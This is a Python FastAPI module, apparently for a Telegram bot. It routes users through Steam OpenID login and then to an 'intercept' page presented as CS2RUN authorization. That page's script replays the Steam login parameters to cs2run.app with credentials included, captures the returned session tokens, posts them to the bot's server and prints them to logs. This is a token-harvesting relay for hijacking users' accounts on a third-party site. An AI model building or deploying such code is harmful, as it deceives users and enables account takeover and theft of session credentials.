# steam_auth.py
from fastapi import APIRouter, Request, Query
from fastapi.responses import HTMLResponse, RedirectResponse
import urllib.parse
import json

router = APIRouter()
SELF_URL = "https://tg-bot-test-gkbp.onrender.com"

# -------------------------------
# 1️⃣ Login → Steam
# -------------------------------
@router.get("/auth/login")
async def auth_login(chat_id: int):
    callback_url = f"{SELF_URL}/auth/callback?chat_id={chat_id}"

    steam_url = (
        "https://steamcommunity.com/openid/login?"
        "openid.ns=http://specs.openid.net/auth/2.0&"
        "openid.mode=checkid_setup&"
        "openid.claimed_id=http://specs.openid.net/auth/2.0/identifier_select&"
        "openid.identity=http://specs.openid.net/auth/2.0/identifier_select&"
        f"openid.return_to={urllib.parse.quote(callback_url)}&"
        f"openid.realm={urllib.parse.quote(SELF_URL)}"
    )

    return RedirectResponse(steam_url)

# -------------------------------
# 2️⃣ Callback после Steam
# -------------------------------
# /auth/callback
@router.get("/auth/callback")
async def auth_callback(request: Request, chat_id: int = Query(...)):
    steam_params = dict(request.query_params)

    print("\n🧪 STEAM CALLBACK PARAMS:\n", steam_params, "\n")

    # Показываем страницу-перехватчик независимо от openid.*
    intercept_url = f"{SELF_URL}/intercept?chat_id={chat_id}"
    return RedirectResponse(intercept_url)

# -------------------------------
# 3️⃣ Страница-перехватчик, ловим токены CS2RUN
# -------------------------------
@router.get("/intercept")
async def intercept():
    return HTMLResponse(f"""
<!DOCTYPE html>
<html>
<head><title>Авторизация…</title></head>
<body>
<h3>🔐 Авторизация через CS2RUN…</h3>
<p>Пожалуйста, дождитесь окончания процесса</p>

<script>
(async function() {{
    try {{
        // Берём все GET параметры страницы (openid.* + chat_id)
        const params = new URLSearchParams(window.location.search);
        const qs = params.toString();

        // Делаем fetch к CS2RUN с этими параметрами
        const resp = await fetch(`https://cs2run.app/auth/1/start-sign-in/?${{qs}}`, {{
            method: 'GET',
            credentials: 'include'
        }});

        // Перехватываем JSON с токенами
        const data = await resp.json();
        console.log("🔥 GOT CS2RUN TOKENS:", data);

        // Отправляем на сервер для бота
        await fetch('{SELF_URL}/bot/receive?chat_id=' + params.get('chat_id'), {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(data)
        }});

        document.body.innerHTML = "<h3>✅ Токены получены! Можно закрывать окно</h3>";

    }} catch(e) {{
        console.error("Ошибка при перехвате токенов:", e);
        document.body.innerHTML = "<h3>❌ Ошибка при получении токенов. Попробуйте ещё раз</h3>";
    }}
}})();
</script>

</body>
</html>
""")

# -------------------------------
# 4️⃣ Сервер принимает токены
# -------------------------------
@router.post("/bot/receive")
async def receive_tokens(chat_id: int, payload: dict):
    print("\n🔥 GOT TOKENS FOR CHAT", chat_id, ":\n", json.dumps(payload, indent=2), "\n")
    # Здесь можно положить их в RAM или сразу использовать для бота
    return {"ok": True}